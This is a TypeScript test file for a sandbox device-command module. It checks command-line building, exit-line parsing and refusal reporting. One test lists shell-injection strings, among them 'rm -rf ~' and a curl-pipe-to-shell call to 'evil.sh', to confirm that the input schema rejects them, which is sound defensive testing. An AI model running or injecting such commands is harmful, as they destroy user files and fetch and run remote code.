import type { DeviceCommandInput } from "@intentic/sandbox-contract";
import { DeviceCommandInputSchema } from "@intentic/sandbox-contract";
import { expect, test } from "vitest";
import { DEVICE_COMMANDS, outcomeOf, streamOf, succeeded } from "./device-commands.js";

test("builds each action's command line from the name alone", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line(undefined)).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["mirror-on"].line(undefined)).toBe("intentic-machine sync mirror on");
});

test("scopes an action to one paired sandbox when it is given one", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line("sandbox-0738cd6b5027-intentic-dev")).toBe(
        "intentic-machine sync mirror off --sandbox sandbox-0738cd6b5027-intentic-dev",
    );
});

// Sandbox ids match `[A-Za-z0-9._-]+`: no room for a separator, quote or flag.
test("refuses a sandbox id that could be anything but an id", () => {
    const input = (sandboxId: string): unknown => ({ id: "laptop", command: "mirror-off", sandboxId });
    expect(DeviceCommandInputSchema.safeParse(input("sandbox-0738cd6b5027-intentic-dev")).success).toBe(true);
    for (const hostile of ["a; rm -rf ~", "a && curl evil.sh | sh", "a b", "$(whoami)", "`id`", "--takeover", "a\nb"]) {
        expect(DeviceCommandInputSchema.safeParse(input(hostile)).success).toBe(false);
    }
    expect(DeviceCommandInputSchema.safeParse({ id: "laptop", command: "rm-rf" }).success).toBe(false);
});

// Fixture: mimics run_command's exit-line-plus-fenced-streams text; success reads only the exit line.
const answer = (exit: string, stdout?: string, stderr?: string): { text: string; refused: boolean } => ({
    text: [exit, stdout === undefined ? "" : `--- stdout ---\n${stdout}`, stderr === undefined ? "" : `--- stderr ---\n${stderr}`]
        .filter((part) => part !== "")
        .join("\n"),
    refused: false,
});

test("reads success off the exit line, not off what was printed", () => {
    expect(succeeded("Exit code 0 (success).\n--- stdout ---\nfine")).toBe(true);
    expect(succeeded("Exit code 1 (failed).\n--- stdout ---\nPort mirroring OFF for: x")).toBe(false);
    expect(succeeded("The command was killed after 20s.")).toBe(false);
});

test("splits one stream out of the fenced answer without swallowing the other", () => {
    const text = answer("Exit code 0 (success).", "the good news", "a warning").text;
    expect(streamOf(text, "--- stdout ---")).toBe("the good news");
    expect(streamOf(text, "--- stderr ---")).toBe("a warning");
    expect(streamOf("Exit code 0 (success).", "--- stdout ---")).toBe("");
});

test("shows what the command itself said when it worked", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 0 (success).", "Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev."));
    expect(result.ok).toBe(true);
    expect(result.message).toBe("Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev.");
});

test("falls back to its own words when the command printed nothing", () => {
    const result = outcomeOf("mirror-on", answer("Exit code 0 (success)."));
    expect(result.ok).toBe(true);
    expect(result.message).toContain("Port mirroring is back on");
});

test("keeps the machine's own refusal, switch and all", () => {
    const refusal = 'Refused: "Run commands" is switched off for this device.';
    const result = outcomeOf("mirror-off", { text: refusal, refused: true });
    expect(result.ok).toBe(false);
    expect(result.message).toBe(refusal);
});

test("reports a failed command in the machine's words, stderr first", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 127 (failed).", undefined, "intentic-machine: command not found"));
    expect(result.ok).toBe(false);
    expect(result.message).toBe("intentic-machine: command not found");
    expect(result.output).toContain("Exit code 127");
});

// Also a compile check: an action added to the contract's enum with no table row fails to type-check.
test("implements every action the contract names", () => {
    const commands: DeviceCommandInput["command"][] = ["mirror-off", "mirror-on", "sync-pause", "sync-resume", "sync-unpair"];
    expect(Object.keys(DEVICE_COMMANDS).toSorted()).toEqual(commands.toSorted());
});

// Bare acts on every sandbox the device pairs; omitting the id on sync-unpair would unpair all of them, not just turn
// off one switch.
test("builds each command line from the name and at most the row's own sandbox", () => {
    expect(DEVICE_COMMANDS["sync-pause"].line("work-abc")).toBe("intentic-machine sync pause --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-resume"].line("work-abc")).toBe("intentic-machine sync resume --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-unpair"].line("work-abc")).toBe("intentic-machine sync uninstall --sandbox work-abc");
    expect(DEVICE_COMMANDS["mirror-off"].line(undefined)).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["sync-unpair"].scoped).toBe(true);
    expect(DEVICE_COMMANDS["mirror-off"].scoped).toBeUndefined();
});
